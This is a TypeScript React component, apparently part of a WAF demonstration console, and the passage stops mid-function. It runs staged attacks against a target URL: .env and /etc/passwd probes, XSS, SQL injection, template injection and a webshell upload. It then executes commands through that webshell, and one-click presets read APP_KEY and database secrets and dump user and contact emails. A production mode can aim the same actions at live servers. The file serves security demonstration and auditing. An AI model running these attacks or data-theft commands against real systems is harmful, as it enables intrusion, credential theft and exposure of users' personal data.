import { useState } from "react";
import {
    CheckIcon,
    ContactIcon,
    CopyIcon,
    DicesIcon,
    ExternalLinkIcon,
    EyeIcon,
    FlaskConicalIcon,
    FolderSearchIcon,
    KeyRoundIcon,
    LockIcon,
    PlayIcon,
    RefreshCwIcon,
    SendIcon,
    ShieldCheckIcon,
    SkullIcon,
    TriangleAlertIcon,
    UsersIcon,
    XIcon,
} from "lucide-react";
import { cn } from "cn";
import {
    Accordion,
    AccordionContent,
    AccordionItem,
    AccordionTrigger,
} from "@/components/ui/accordion";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { VULN_INFO, severityVariant, type ChainStep } from "@/lib/vulnInfo";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import {
    Card,
    CardAction,
    CardContent,
    CardDescription,
    CardHeader,
    CardTitle,
} from "@/components/ui/card";
import { Empty, EmptyDescription, EmptyTitle } from "@/components/ui/empty";
import {
    AlertDialog,
    AlertDialogAction,
    AlertDialogCancel,
    AlertDialogContent,
    AlertDialogDescription,
    AlertDialogFooter,
    AlertDialogHeader,
    AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
    Progress,
    ProgressLabel,
    ProgressValue,
} from "@/components/ui/progress";
import { Separator } from "@/components/ui/separator";
import { Skeleton } from "@/components/ui/skeleton";
import { Spinner } from "@/components/ui/spinner";
import {
    Tooltip,
    TooltipContent,
    TooltipProvider,
    TooltipTrigger,
} from "@/components/ui/tooltip";
import type { NoPasakRecommendation } from "@/lib/noPasak";
import type { ProxyResult, SendRawFn } from "@/hooks/useWafConsole";
import { noPasakRecommendations, noPasakStages } from "@/lib/noPasak";
import { randomPublicIp } from "@/lib/ip";
import {
    MethodSheet,
    type BusyState,
    type MethodRun,
    type PendingMethodState,
    type ProofGrade,
    type SheetMethodState,
} from "./sheet";

interface FileCheck {
    fileUrl: string;
    status?: number;
    ok: boolean;
    snippet: string;
}

interface ExecResult {
    cmd: string;
    status?: number;
    ok: boolean;
    output: string;
}

interface AccessLinksProps {
    url: string;
    body?: string;
}

interface NoPasakTabProps {
    sendRaw: SendRawFn;
    target: string;
    onTargetChange?: (v: string) => void;
    mode?: "local" | "production";
}

/**
 * Tab "Tanpa Pasak = Jebol": audit 4 tahap berurutan yang membuktikan
 * aplikasi tanpa WAF benar-benar jebol, diakhiri verifikasi webshell + vonis.
 */

const IMPACTS: Record<string, string> = {
    "Baseline GET /":
        "Tidak ada dampak — ini titik acuan. Semua tahap berikutnya dibandingkan terhadap respons normal ini.",
    "Scanner UA sqlmap":
        "Petakan seluruh route, versi framework, dan celah tanpa hambatan. Tahap awal sebelum eksploitasi terarah.",
    "Probe /.env":
        "Ambil APP_KEY, DB_PASSWORD, kredensial SMTP/AWS dari .env → dekripsi cookie, akses database, ambil alih server.",
    "Path Traversal /etc/passwd":
        "Baca berkas sensitif server (/etc/passwd, config). Langkah awal menuju LFI → RCE via log poisoning.",
    "XSS Reflected <script>":
        "Curi sesi & cookie pengunjung via <script> yang tereksekusi, deface halaman, keylogging. Respons 200 = browser korban akan menjalankan JS ini.",
    "SQLi Auth Bypass OR 1=1":
        "Bypass login / dump tabel users via UNION SELECT. Penyerang bisa enumerasi kolom password selangkah demi selangkah.",
    "SSTI Canary {{7*7}}":
        "Eksekusi template di server (baca {{7*7}}=49) → RCE. Canary lolos = engine template mengevaluasi input penyerang.",
    "PHP Injection <?php":
        "Suntik kode PHP via parameter → RCE bila ada include/eval. Pintu masuk webshell permanen.",
    "Upload shell.php.jpg":
        "Tanam webshell permanen (shell.php.jpg) → eksekusi perintah jarak jauh (?cmd=id), pencurian data, ransomware.",
};

const QUICK_COMMANDS = [
    "id",
    "whoami",
    "pwd",
    "ls",
    "cat /etc/hostname",
] as const;

const ATTACKER_PRESETS = [
    {
        label: "🗝️ Curi kredensial (.env)",
        cmd: "grep -E '^(APP_KEY|DB_)' .env",
        icon: KeyRoundIcon,
    },
    {
        label: "👥 Curi daftar user (DB)",
        cmd: 'php artisan tinker --execute=\'echo App\\Models\\User::pluck("email")->join(", ");\' 2>/dev/null | tail -1',
        icon: UsersIcon,
    },
    {
        label: "📇 Curi data kontak (DB)",
        cmd: 'php artisan tinker --execute=\'echo App\\Models\\Contact::pluck("email")->join(", ");\' 2>/dev/null | tail -1',
        icon: ContactIcon,
    },
    {
        label: "📁 Petakan file penting",
        cmd: "ls -la .env database/ storage/app/public/ 2>/dev/null",
        icon: FolderSearchIcon,
    },
] as const;

const PREVIEW_PAGES = ["/", "/upload", "/contacts", "/waf-hits.json"] as const;

function evidenceFor(
    item: NoPasakRecommendation,
    res: ProxyResult | undefined,
): string {
    if (!res?.success) {
        return "Kirim serangan dulu untuk melihat bukti respons.";
    }
    const body = res.body ?? "";
    const snippet = body.replace(/\s+/g, " ").slice(0, 160);
    switch (item.label) {
        case "Baseline GET /":
            return `GET / menjawab ${res.status} dalam ${res.duration_ms}ms — target hidup, baseline sah.`;
        case "Path Traversal /etc/passwd":
            return /root:/.test(body)
                ? "Body memuat 'root:' — isi /etc/passwd BERHASIL dibaca!"
                : `Status ${res.status} (bukan 403) = WAF tidak menolak traversal.`;
        case "Probe /.env":
            if (/APP_KEY|DB_/.test(body)) {
                return "Body memuat APP_KEY/DB_* — kredensial BOCOR!";
            }
            if (res.status === 403 || res.status === 429) {
                return `Status ${res.status} dengan body kecil (${res.size} byte)? Itu ciri blokir level WEB SERVER (mis. aturan Nginx "deny dotfiles") — BUKAN WAF aplikasi. Cek header Server + ukuran body untuk memastikan, lalu catat sebagai temuan positif infra dan lanjut dengan catatan.`;
            }
            return `Status ${res.status} (bukan 403) = probe tidak diblokir.`;
        case "SSTI Canary {{7*7}}":
            return /49/.test(body)
                ? "Body memuat '49' — template MENGEVALUASI {{7*7}}! RCE selangkah lagi."
                : `Status ${res.status} (bukan 403) = canary tidak disaring.`;
        case "XSS Reflected <script>":
            return `Query <script> dikembalikan mentah (${res.size} byte). Cuplikan: "${snippet}..."`;
        case "Upload shell.php.jpg":
            return /"ok":true/.test(body)
                ? `Respons {"ok":true} — file DITERIMA server. Lanjut ke verifikasi file di bawah.`
                : `Status ${res.status}. Cuplikan: "${snippet}..."`;
        default:
            return `Status ${res.status} (bukan 403) — serangan tidak ditolak. Cuplikan: "${snippet}..."`;
    }
}

const isPassed = (res: ProxyResult | undefined): boolean =>
    res?.success === true && res.status !== 403 && res.status !== 429;

/**
 * Jujur seperti hacker: 403 = ditolak; lolos tanpa jejak = hanya "tak diblokir";
 * TERBUKTI hanya bila body memuat jejak (refleksi payload, root:, ok:true, ...).
 */
function gradeVector(res: ProxyResult, path: string): ProofGrade {
    if (res.success !== true || res.status === 403 || res.status === 429) {
        return "blocked";
    }
    const body = res.body ?? "";
    let fragment = "";
    try {
        fragment = decodeURIComponent(path.split("?")[1] ?? "").slice(0, 40);
    } catch {
        fragment = "";
    }
    const markers = [
        fragment.length > 6 ? fragment : "",
        "root:",
        '"ok":true',
        "APP_KEY",
        "document.cookie",
        "onerror=",
        "onload=",
    ].filter((mk) => mk !== "");
    return markers.some((mk) => body.includes(mk)) ? "proven" : "passed";
}

/**
 * Cara mengakses hasil upload yang berhasil: link langsung yang bisa diklik
 * (buka di tab baru) — persis seperti yang dilakukan penyerang.
 */
function AccessLinks({ url, body }: AccessLinksProps) {
    let filename = "shell.php.jpg";
    let filePath = "/storage/demo-uploads/shell.php.jpg";
    try {
        const parsed = JSON.parse(body ?? "");
        if (parsed.filename) {
            filename = parsed.filename;
        }
        if (parsed.url) {
            filePath = parsed.url;
        }
    } catch {
        // Pakai bawaan bila body bukan JSON.
    }
    const base = (url || "http://localhost:8000").replace(/\/+$/, "");
    const links = [
        {
            label: "📂 File publik (isi PHP tampil)",
            href: `${base}${filePath}`,
        },
        {
            label: "☠️ Eksekusi ?cmd=id",
            href: `${base}/shell/${filename}?cmd=id`,
        },
        {
            label: "☠️ Eksekusi ?cmd=whoami",
            href: `${base}/shell/${filename}?cmd=whoami`,
        },
        { label: "📤 Halaman daftar upload (/upload)", href: `${base}/upload` },
    ];
    return (
        <Alert className="mt-2">
            <ExternalLinkIcon data-icon="inline-start" />
            <AlertTitle>
                🔗 Cara mengakses hasil (klik untuk membuka):
            </AlertTitle>
            <AlertDescription>
                <ul className="mt-1 flex flex-col gap-1">
                    {links.map((link) => (
                        <li key={link.href}>
                            <Button
                                variant="link"
                                size="sm"
                                className="h-auto justify-start p-0 font-mono break-all whitespace-normal"
                                render={
                                    <a
                                        href={link.href}
                                        target="_blank"
                                        rel="noreferrer"
                                    >
                                        {link.label} — {link.href}
                                    </a>
                                }
                            />
                        </li>
                    ))}
                </ul>
            </AlertDescription>
        </Alert>
    );
}

interface RecommendationCardProps {
    item: NoPasakRecommendation;
    index: number;
    res: ProxyResult | undefined;
    busy: BusyState;
    proved: boolean;
    onToggleProved: () => void;
    onFire: () => void;
    onVerifyUpload: () => void;
    onRunMethod: (mi: number) => void;
    methodRuns: Record<string, MethodRun>;
    copiedIdx: number | null;
    onCopyJson: (index: number, text: string) => void;
    mode: "local" | "production";
    url: string;
    fileCheck: FileCheck | null;
}

function RecommendationCard({
    item,
    index,
    res,
    busy,
    proved,
    onToggleProved,
    onFire,
    onVerifyUpload,
    onRunMethod,
    methodRuns,
    copiedIdx,
    onCopyJson,
    mode,
    url,
    fileCheck,
}: RecommendationCardProps) {
    const passed = isPassed(res);
    const isCardBusy = busy === index;
    const isVerifyBusy = busy === `verify-${index}`;
    const info = VULN_INFO[item.label];

    const json =
        res === undefined
            ? "Belum ada hasil — kirim serangan dulu."
            : JSON.stringify(
                  {
                      vektor: item.label,
                      method: item.method,
                      path: item.path,
                      target: url,
                      hasil: res.success
                          ? {
                                status: res.status,
                                status_text: res.status_text,
                                durasi_ms: res.duration_ms,
                                ip: res.ip,
                                ukuran_byte: res.size,
                            }
                          : { gagal: res.message },
                  },
                  null,
                  2,
              );

    return (
        <Card size="sm">
            <CardHeader>
                <CardTitle className="text-sm">{item.label}</CardTitle>
                <CardAction>
                    {res?.success && (
                        <Badge variant={passed ? "destructive" : "secondary"}>
                            {passed
                                ? `LOLOS (${res.status})`
                                : `DIBLOKIR (${res.status})`}
                        </Badge>
                    )}
                </CardAction>
                <CardDescription className="flex flex-wrap items-center gap-2 font-mono text-xs">
                    <Badge
                        variant={
                            item.method === "GET" ? "secondary" : "default"
                        }
                    >
                        {item.method}
                    </Badge>
                    <span className="break-all">{item.path}</span>
                </CardDescription>
            </CardHeader>
            <CardContent className="flex flex-col gap-2">
                <p className="text-muted-foreground">
                    <b>Kenapa efektif:</b> {item.why}
                </p>
                <p className="text-muted-foreground">
                    <b>Bukti:</b> {item.proof}
                </p>
                <div className="flex flex-wrap gap-2">
                    <Button
                        type="button"
                        size="sm"
                        variant="outline"
                        onClick={onFire}
                        disabled={busy !== null}
                    >
                        {isCardBusy ? (
                            <Spinner data-icon="inline-start" />
                        ) : (
                            <SendIcon data-icon="inline-start" />
                        )}
                        {isCardBusy ? "Mengirim..." : "Kirim serangan ini"}
                    </Button>
                    <Button
                        type="button"
                        size="sm"
                        variant="outline"
                        onClick={onToggleProved}
                    >
                        <FlaskConicalIcon data-icon="inline-start" />
                        {proved
                            ? "Sembunyikan bukti"
                            : "💥 Buktikan: kalau lolos, apa yang bisa saya lakukan?"}
                    </Button>
                </div>

                {proved && (
                    <Alert>
                        <SkullIcon data-icon="inline-start" />
                        <AlertTitle>
                            💀 Dampak: {IMPACTS[item.label]}
                        </AlertTitle>
                        <AlertDescription>
                            <b>Bukti respons:</b> {evidenceFor(item, res)}
                        </AlertDescription>
                        {!res && (
                            <AlertDescription className="mt-1">
                                Tekan “Kirim serangan ini” dulu.
                            </AlertDescription>
                        )}
                    </Alert>
                )}

                {item.label === "Upload shell.php.jpg" && passed && (
                    <>
                        {mode === "local" && (
                            <AccessLinks url={url} body={res?.body} />
                        )}
                        <Alert>
                            <ShieldCheckIcon data-icon="inline-start" />
                            <AlertTitle>Langkah pembuktian wajib:</AlertTitle>
                            {mode === "production" ? (
                                <AlertDescription className="flex flex-col gap-2">
                                    <span>
                                        Verifikasi otomatis hanya tahu layout
                                        disk <b>lab lokal</b> (
                                        <code>/storage/demo-uploads/…</code>),
                                        sehingga tidak bisa dipakai di server
                                        produksi. Sebagai gantinya, yakinkan
                                        peserta dengan verifikasi manual di
                                        server (SSH):
                                    </span>
                                    <ol className="ml-4 list-decimal">
                                        <li>
                                            Buktikan upload <b>tidak ditolak</b>
                                            : respons di atas bukan 403.
                                        </li>
                                        <li>
                                            Jalankan di server:{" "}
                                            <code>
                                                find . -name &apos;shell*&apos;
                                                -newer composer.json 2{">"}
                                                /dev/null
                                            </code>{" "}
                                            — bila file muncul = temuan kritis.
                                        </li>
                                        <li>
                                            Periksa log upload aplikasi: nama{" "}
                                            <code>shell.php.jpg</code> tercatat
                                            tersimpan di mana.
                                        </li>
                                        <li>
                                            Untuk demo RCE penuh, ulangi tahap
                                            ini ke lab lokal <code>:8000</code>{" "}
                                            — di sana verifikasi otomatis +
                                            kartu penyerang aktif.
                                        </li>
                                    </ol>
                                </AlertDescription>
                            ) : (
                                <AlertDescription>
                                    <ol className="ml-4 list-decimal">
                                        <li>
                                            Upload menjawab{" "}
                                            <code>{'{"ok":true}'}</code> — file
                                            diterima.
                                        </li>
                                        <li>
                                            Tekan tombol verifikasi: mengambil
                                            file-nya kembali via HTTP.
                                        </li>
                                        <li>
                                            Bila isi <code>system(</code> tampil
                                            = webshell AKTIF & publik.
                                        </li>
                                    </ol>
                                </AlertDescription>
                            )}

                            {mode === "local" && (
                                <div className="mt-2">
                                    <Button
                                        type="button"
                                        size="sm"
                                        variant="secondary"
                                        onClick={onVerifyUpload}
                                        disabled={busy !== null}
                                    >
                                        {isVerifyBusy && (
                                            <Spinner data-icon="inline-start" />
                                        )}
                                        {isVerifyBusy
                                            ? "Memverifikasi..."
                                            : "🔍 Verifikasi file webshell bisa diakses"}
                                    </Button>
                                </div>
                            )}

                            {mode === "local" &&
                                (fileCheck ? (
                                    <AlertDescription className="mt-2 font-mono">
                                        GET {fileCheck.fileUrl} →{" "}
                                        {fileCheck.status}{" "}
                                        {fileCheck.ok ? (
                                            <b>
                                                WEBSHELL AKTIF — isi PHP tampil
                                                publik! ✅ terbukti
                                            </b>
                                        ) : (
                                            <span>
                                                belum terbukti —{" "}
                                                {fileCheck.snippet.slice(
                                                    0,
                                                    100,
                                                )}
                                            </span>
                                        )}
                                    </AlertDescription>
                                ) : (
                                    isVerifyBusy && (
                                        <Skeleton className="mt-2 h-4 w-full" />
                                    )
                                ))}
                        </Alert>
                    </>
                )}

                {res && (
                    <p className="text-xs text-muted-foreground">
                        {res.success
                            ? `→ ${res.status} ${res.status_text} · ${res.duration_ms}ms · IP ${res.ip}`
                            : `→ gagal: ${res.message}`}
                    </p>
                )}

                {!res && (
                    <Empty className="py-3">
                        <EmptyTitle className="text-xs">
                            Belum ada respons
                        </EmptyTitle>
                        <EmptyDescription className="text-xs">
                            Tekan “Kirim serangan ini” dulu.
                        </EmptyDescription>
                    </Empty>
                )}

                {info && (
                    <Accordion className="mt-1">
                        <AccordionItem value="json">
                            <AccordionTrigger className="text-xs">
                                📄 Preview JSON hasil pengujian
                            </AccordionTrigger>
                            <AccordionContent>
                                <div className="flex justify-end">
                                    <Button
                                        type="button"
                                        size="sm"
                                        variant="outline"
                                        disabled={res === undefined}
                                        onClick={() => onCopyJson(index, json)}
                                    >
                                        <CopyIcon data-icon="inline-start" />
                                        {copiedIdx === index
                                            ? "Disalin ✓"
                                            : "Copy JSON"}
                                    </Button>
                                </div>
                                <pre className="mt-1 max-h-56 overflow-auto rounded bg-black p-2 font-mono text-[11px] text-green-300">
                                    {json}
                                </pre>
                            </AccordionContent>
                        </AccordionItem>

                        <AccordionItem value="vuln">
                            <AccordionTrigger className="text-xs">
                                🛡️ Kerentanan & celah yang dapat dimanfaatkan
                            </AccordionTrigger>
                            <AccordionContent className="flex flex-col gap-1 text-xs">
                                <p>
                                    <Badge
                                        variant={severityVariant(info.severity)}
                                    >
                                        {info.severity}
                                    </Badge>{" "}
                                    <span className="font-mono">
                                        {info.cwe}
                                    </span>
                                </p>
                                <p>
                                    <b>{info.vuln}</b>
                                </p>
                                <p className="text-muted-foreground">
                                    {info.gap}
                                </p>
                            </AccordionContent>
                        </AccordionItem>

                        <AccordionItem value="methods">
                            <AccordionTrigger className="text-xs">
                                🔪 Contoh metode serangan hacker
                            </AccordionTrigger>
                            <AccordionContent>
                                <ol className="ml-4 list-decimal text-xs">
                                    {info.methods.map((m, mi) => {
                                        const run =
                                            methodRuns[`${index}:${mi}`];
                                        const isMethodBusy =
                                            busy === `method-${index}:${mi}`;
                                        return (
                                            <li key={m.title} className="mt-2">
                                                <b>{m.title}:</b>{" "}
                                                <span className="text-muted-foreground">
                                                    {m.desc}
                                                </span>
                                                {m.exec !== undefined && (
                                                    <div className="mt-1">
                                                        <Button
                                                            type="button"
                                                            size="sm"
                                                            variant="destructive"
                                                            disabled={
                                                                busy !== null
                                                            }
                                                            onClick={() =>
                                                                onRunMethod(mi)
                                                            }
                                                        >
                                                            {isMethodBusy ? (
                                                                <Spinner data-icon="inline-start" />
                                                            ) : (
                                                                <PlayIcon data-icon="inline-start" />
                                                            )}
                                                            {isMethodBusy
                                                                ? "Mengeksekusi..."
                                                                : mode ===
                                                                    "production"
                                                                  ? "▶ Eksekusi (produksi — konfirmasi)"
                                                                  : "▶ Eksekusi metode ini"}
                                                        </Button>
                                                    </div>
                                                )}
                                                {run !== undefined && (
                                                    <div className="mt-1 rounded bg-black p-2 font-mono text-[11px]">
                                                        <p
                                                            className={
                                                                run.grade ===
                                                                "proven"
                                                                    ? "text-green-300"
                                                                    : run.grade ===
                                                                        "passed"
                                                                      ? "text-amber-300"
                                                                      : "text-red-300"
                                                            }
                                                        >
                                                            {run.grade ===
                                                            "proven"
                                                                ? "✅ TERBUKTI"
                                                                : run.grade ===
                                                                    "passed"
                                                                  ? "⚠️ LOLOS TANPA BUKTI"
                                                                  : "⛔ DITOLAK"}{" "}
                                                            {run.output.slice(
                                                                0,
                                                                300,
                                                            )}
                                                        </p>
                                                        <pre className="mt-1 max-h-32 overflow-auto whitespace-pre-wrap text-green-300/80">
                                                            {run.json}
                                                        </pre>
                                                    </div>
                                                )}
                                            </li>
                                        );
                                    })}
                                </ol>
                                {mode === "production" && (
                                    <p className="mt-1 text-[11px] text-muted-foreground">
                                        Eksekusi ke produksi meminta konfirmasi
                                        per tindakan — hanya bila temuan
                                        terbukti (tidak 403).
                                    </p>
                                )}
                            </AccordionContent>
                        </AccordionItem>
                    </Accordion>
                )}
            </CardContent>
        </Card>
    );
}

interface AttackerCardProps {
    uploadIdx: number;
    execCmd: string;
    onExecCmdChange: (cmd: string) => void;
    execResult: ExecResult | null;
    busy: BusyState;
    onExploitShell: (uploadIdx: number) => void;
    onExploitShellWith: (uploadIdx: number, rawCmd: string) => void;
}

function AttackerCard({
    uploadIdx,
    execCmd,
    onExecCmdChange,
    execResult,
    busy,
    onExploitShell,
    onExploitShellWith,
}: AttackerCardProps) {
    const isExecBusy = busy === `exec-${uploadIdx}`;

    return (
        <Card size="sm" className="lg:col-span-2">
            <CardHeader>
                <CardTitle>
                    ☠️ Kartu Penyerang — Manfaatkan Hasil Susupan
                </CardTitle>
                <CardAction>
                    {execResult?.ok && (
                        <Badge variant="destructive">RCE AKTIF</Badge>
                    )}
                </CardAction>
                <CardDescription>
                    Webshell terverifikasi. Bertindak sebagai penyerang: kiri
                    perintah bebas, kanan paket pencurian data sekali klik.
                </CardDescription>
            </CardHeader>
            <CardContent className="flex flex-col gap-3">
                <div className="grid gap-3 xl:grid-cols-2">
                    <div>
                        <Label className="mb-1 text-[11px] font-bold">
                            KIRI — perintah bebas
                        </Label>
                        <div className="flex flex-wrap gap-2">
                            <Input
                                type="text"
                                value={execCmd}
                                onChange={(e) =>
                                    onExecCmdChange(e.target.value)
                                }
                                placeholder="id"
                                className="min-w-0 flex-1 font-mono"
                            />
                            <Button
                                type="button"
                                size="sm"
                                variant="destructive"
                                onClick={() => onExploitShell(uploadIdx)}
                                disabled={busy !== null}
                            >
                                {isExecBusy ? (
                                    <Spinner data-icon="inline-start" />
                                ) : (
                                    <PlayIcon data-icon="inline-start" />
                                )}
                                {isExecBusy ? "Menjalankan..." : "▶ Jalankan"}
                            </Button>
                        </div>
                        <div className="mt-1 flex flex-wrap gap-1 text-[11px]">
                            {QUICK_COMMANDS.map((c) => (
                                <Button
                                    key={c}
                                    type="button"
                                    size="sm"
                                    variant="outline"
                                    onClick={() => onExecCmdChange(c)}
                                    className="font-mono"
                                >
                                    {c}
                                </Button>
                            ))}
                        </div>
                    </div>
                    <div>
                        <Label className="mb-1 text-[11px] font-bold">
                            KANAN — curi data hasil susupan
                        </Label>
                        <div className="flex flex-col gap-1">
                            {ATTACKER_PRESETS.map((preset) => (
                                <Button
                                    key={preset.label}
                                    type="button"
                                    size="sm"
                                    variant="outline"
                                    disabled={busy !== null}
                                    onClick={() => {
                                        onExecCmdChange(preset.cmd);
                                        setTimeout(() => {
                                            void onExploitShellWith(
                                                uploadIdx,
                                                preset.cmd,
                                            );
                                        }, 0);
                                    }}
                                    className="justify-start"
                                >
                                    <preset.icon data-icon="inline-start" />
                                    {preset.label}
                                </Button>
                            ))}
                        </div>
                    </div>
                </div>

                {execResult ? (
                    <pre className="overflow-x-auto rounded bg-black p-2 font-mono text-green-300">
                        $ {execResult.cmd}
                        {"\n"}
                        {execResult.ok
                            ? execResult.output
                            : `(gagal/HTTP ${execResult.status}) ${execResult.output.slice(0, 200)}`}
                    </pre>
                ) : (
                    isExecBusy && <Skeleton className="h-16 w-full" />
                )}

                {execResult?.ok && (
                    <Alert variant="destructive">
                        <TriangleAlertIcon data-icon="inline-start" />
                        <AlertTitle>
                            RCE TERBUKTI ✅ — tanpa Pasak, penyerang kini
                            mengendalikan server. Vonis: JEBOL TOTAL.
                        </AlertTitle>
                    </Alert>
                )}
            </CardContent>
        </Card>
    );
}

interface LivePreviewCardProps {
    previewUrl: string;
    previewPage: string;
    previewTick: number;
    onPageChange: (page: string) => void;
    onRefresh: () => void;
}

function LivePreviewCard({
    previewUrl,
    previewPage,
    previewTick,
    onPageChange,
    onRefresh,
}: LivePreviewCardProps) {
    return (
        <Card>
            <CardHeader>
                <CardTitle>👁️ Preview Korban (live)</CardTitle>
                <CardAction>
                    <Tooltip>
                        <TooltipTrigger
                            render={
                                <Button
                                    type="button"
                                    variant="outline"
                                    size="icon-sm"
                                    onClick={onRefresh}
                                >
                                    <RefreshCwIcon data-icon="inline-start" />
                                </Button>
                            }
                        />
                        <TooltipContent>Segarkan preview</TooltipContent>
                    </Tooltip>
                </CardAction>
                <CardDescription className="font-mono break-all">
                    {previewUrl}
                </CardDescription>
            </CardHeader>
            <CardContent className="flex flex-col gap-2">
                <div className="flex flex-wrap gap-1 text-[11px]">
                    {PREVIEW_PAGES.map((page) => (
                        <Button
                            key={page}
                            type="button"
                            size="sm"
                            variant={
                                previewPage === page ? "secondary" : "outline"
                            }
                            onClick={() => onPageChange(page)}
                            className="font-mono"
                        >
                            {page}
                        </Button>
                    ))}
                    <Button
                        variant="outline"
                        size="sm"
                        render={
                            <a
                                href={previewUrl}
                                target="_blank"
                                rel="noreferrer"
                            >
                                <ExternalLinkIcon data-icon="inline-start" />⬈
                                tab baru
                            </a>
                        }
                    />
                </div>
                <div className="overflow-hidden rounded-lg bg-white ring-1 ring-foreground/10">
                    <iframe
                        key={`${previewUrl}#${previewTick}`}
                        src={previewUrl}
                        title="Preview aplikasi yang diserang"
                        sandbox="allow-forms allow-scripts"
                        className="h-[560px] w-full bg-white"
                    />
                </div>
                <p className="flex items-center gap-1 text-[11px] text-muted-foreground">
                    <EyeIcon data-icon="inline-start" />
                    Otomatis segar tiap serangan dikirim. Buka <code>
                        /
                    </code>{" "}
                    untuk Monitor, <code>/upload</code> untuk bukti file masuk.
                </p>
                <Alert>
                    <ShieldCheckIcon data-icon="inline-start" />
                    <AlertTitle>Preview kosong / ditolak browser?</AlertTitle>
                    <AlertDescription className="flex flex-col gap-2">
                        <span>
                            Itu artinya target mengirim{" "}
                            <code>X-Frame-Options: SAMEORIGIN</code> atau{" "}
                            <code>frame-ancestors</code> (proteksi clickjacking
                            — justru nilai plus untuk audit). Serangan via
                            tombol di kiri tetap jalan; hanya bingkai preview
                            yang diblokir. Klik <b>⬈ tab baru</b> di atas untuk
                            melihat langsung.
                        </span>
                        <span>
                            Khusus lab lokal, izinkan bingkai dari konsol ini
                            dengan header di aplikasi target:
                        </span>
                        <code className="break-all">
                            Content-Security-Policy: frame-ancestors
                            &apos;self&apos; http://localhost:5175
                        </code>
                    </AlertDescription>
                </Alert>
            </CardContent>
        </Card>
    );
}

export default function NoPasakTab({
    sendRaw,
    target,
    onTargetChange,
    mode = "local",
}: NoPasakTabProps) {
    const [results, setResults] = useState<Record<number, ProxyResult>>({});
    const [busy, setBusy] = useState<BusyState>(null);
    const [proved, setProved] = useState<Record<number, boolean>>({});
    const [activeStage, setActiveStage] = useState(1);
    const [fileCheck, setFileCheck] = useState<FileCheck | null>(null);
    const [attackerIp, setAttackerIp] = useState("");
    const [previewPage, setPreviewPage] = useState("/");
    const [previewTick, setPreviewTick] = useState(0);
    const [waived, setWaived] = useState<Record<number, string>>({});
    const [copiedIdx, setCopiedIdx] = useState<number | null>(null);
    const [waiverOpen, setWaiverOpen] = useState(false);
    const [waiverNote, setWaiverNote] = useState("");
    const [execCmd, setExecCmd] = useState("id");
    const [execResult, setExecResult] = useState<ExecResult | null>(null);
    const [methodRuns, setMethodRuns] = useState<Record<string, MethodRun>>({});
    const [sheetOpen, setSheetOpen] = useState(false);
    const [sheetMethod, setSheetMethod] = useState<SheetMethodState | null>(
        null,
    );
    const [sheetRun, setSheetRun] = useState<MethodRun | null>(null);
    const [chainRuns, setChainRuns] = useState<
        Record<string, { status?: number; ok: boolean; note: string }>
    >({});
    const [confirmMethod, setConfirmMethod] = useState(false);
    const [pendingMethod, setPendingMethod] =
        useState<PendingMethodState | null>(null);

    const url = target || "http://localhost:8000";
    const baseUrl = url.replace(/\/+$/, "");
    const previewUrl = `${baseUrl}${previewPage.startsWith("/") ? previewPage : `/${previewPage}`}`;

    const itemsOf = (
        stageId: number,
    ): Array<{ item: NoPasakRecommendation; index: number }> =>
        noPasakRecommendations
            .map((item, index) => ({ item, index }))
            .filter(({ item }) => item.stage === stageId);

    const fire = async (
        item: NoPasakRecommendation,
        index: number,
    ): Promise<ProxyResult> => {
        setBusy(index);
        const res = await sendRaw({
            target: url,
            path: item.path,
            method: item.method,
            ip: attackerIp.trim(),
            userAgent: item.userAgent ?? "",
            upload: item.upload ?? null,
        });
        setResults((prev) => ({ ...prev, [index]: res }));
        setBusy(null);
        setPreviewTick((n) => n + 1);
        return res;
    };

    const fireStage = async (stageId: number): Promise<void> => {
        for (const { item, index } of itemsOf(stageId)) {
            // eslint-disable-next-line no-await-in-loop
            await fire(item, index);
        }
    };

    const stagePassed = (stageId: number): boolean => {
        const entries = itemsOf(stageId);
        return (
            entries.length > 0 &&
            entries.every(({ index }) => isPassed(results[index]))
        );
    };

    const unlocked = (stageId: number): boolean =>
        stageId === 1 ||
        stagePassed(stageId - 1) ||
        waived[stageId - 1] !== undefined;

    /** Tahap 4: buktikan file webshell benar-benar bisa diakses publik. */
    const verifyUploadedFile = async (uploadIndex: number): Promise<void> => {
        if (mode === "production") {
            setFileCheck({
                fileUrl: "",
                status: 0,
                ok: false,
                snippet:
                    "Verifikasi file hanya untuk lab lokal — di produksi, bukti pemblokiran adalah status 403 / file tidak tersimpan.",
            });
            return;
        }
        setBusy(`verify-${uploadIndex}`);
        try {
            const uploadRes = results[uploadIndex];
            let fileUrl = "/storage/demo-uploads/shell.php.jpg";
            try {
                const parsed = JSON.parse(uploadRes?.body ?? "");
                if (parsed.url) {
                    fileUrl = parsed.url;
                }
            } catch {
                // Pakai path bawaan bila body bukan JSON.
            }
            const res = await sendRaw({
                target: url,
                path: fileUrl,
                method: "GET",
                ip: attackerIp.trim(),
            });
            const ok =
                res?.success === true && (res.body ?? "").includes("system(");
            setFileCheck({
                fileUrl,
                status: res?.status,
                ok,
                snippet: (res?.body ?? "").slice(0, 200),
            });
        } finally {
            setBusy(null);
        }
    };

    /** Tahap 4 (lanjutan): manfaatkan webshell — jalankan perintah via /shell. */
    const exploitShellWith = async (
        uploadIndex: number,
        rawCmd: string,
    ): Promise<{ ok: boolean; output: string; status?: number }> => {
        setBusy(`exec-${uploadIndex}`);
        try {
            const cmd = (rawCmd.trim() || "id").slice(0, 500);
            const res = await sendRaw({
                target: url,
                path: `/shell/shell.php.jpg?cmd=${encodeURIComponent(cmd)}`,
                method: "GET",
                ip: attackerIp.trim(),
            });
            let output = res?.body ?? "";
            try {
                const parsed = JSON.parse(output);
                if (parsed.output !== undefined) {
                    output = parsed.output;
                }
            } catch {
                // Biarkan body mentah bila bukan JSON.
            }
            const done = {
                cmd,
                status: res?.status,
                ok: res?.success === true && output.trim() !== "",
                output: output.slice(0, 1000),
            };
            setExecResult(done);
            return done;
        } finally {
            setBusy(null);
        }
    };

    const exploitShell = (
        uploadIndex: number,
    ): Promise<{ ok: boolean; output: string; status?: number }> =>
        exploitShellWith(uploadIndex, execCmd);

    /** Jalankan satu langkah rantai eskalasi dari Sheet. */
    const runChainStep = async (step: ChainStep): Promise<void> => {
        setBusy(`chain-${step.label}`);
        try {
            const res = await sendRaw({
                target: url,
                path: step.path,
                method: step.method ?? "GET",
                ip: attackerIp.trim(),
            });
